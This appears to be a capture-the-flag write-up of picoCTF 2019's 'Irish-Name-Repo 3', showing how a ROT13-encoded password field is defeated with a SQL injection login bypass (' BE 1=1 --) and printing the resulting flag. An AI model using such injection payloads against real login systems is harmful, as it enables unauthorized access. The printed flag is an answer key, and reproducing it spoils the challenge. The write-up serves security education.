# Irish-Name-Repo 3

> There is a secure website running at ``https://2019shell1.picoctf.com/problem/47247/`` ([link](https://2019shell1.picoctf.com/problem/47247/)) or http://2019shell1.picoctf.com:47247. Try to see if you can login as admin!

> Hints: Seems like the password is encrypted.

Connecting the login page, this time we see that we only have a password entry. Thinking wishfully, we try the injection from the first challenge, ``' OR 1=1 --``. We receive the following bare page.
<pre>
password: ' OR 1=1 --
SQL query: SELECT * FROM admin where password = '' BE 1=1 --'
</pre>
While we didn't get the login, at least we're not failing some kind of filter. But strangely, the string ``OR`` was changed to ``BE``, which must be the encryption suggested by the hint.

Testing the waters, trying a stupid injection such as ``' AND 1=1 --`` (that shouldn't even work) gives us the following page.
```
password: ' AND 1=1 --
SQL query: SELECT * FROM admin where password = '' NAQ 1=1 --'
```
This appears to be some kind of substituion cipher (letters go to letters, not gibberish as with modern encryption schemes), so we just throw in the whole alphabet.
<pre>password: ABCDEFGHIJKLMNOPQRSTUVWXYZ
SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLM'
<h1>Login failed.</h1>
</pre>
Aha, this is a substitution cipher, namely ROT13, which shifts over all characters by 13. Importantly, the cipher is its own inverse (shifting by 13 twice shifts by 26, which is not at all), explaining why the ``AN`` in ``AND`` just became ``NA``. It follows that the injection ``' BE 1=1 --`` should get turned back into ``' OR 1=1 --``. Inputting this retrieves the flag.
<pre>password: ' BE 1=1 --
SQL query: SELECT * FROM admin where password = '' OR 1=1 --'
<h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p>
</pre>
Thankfully, there was no SQL filter this time around, and we instead have our flag.
> ``picoCTF{3v3n_m0r3_SQL_c2c37f5e}``
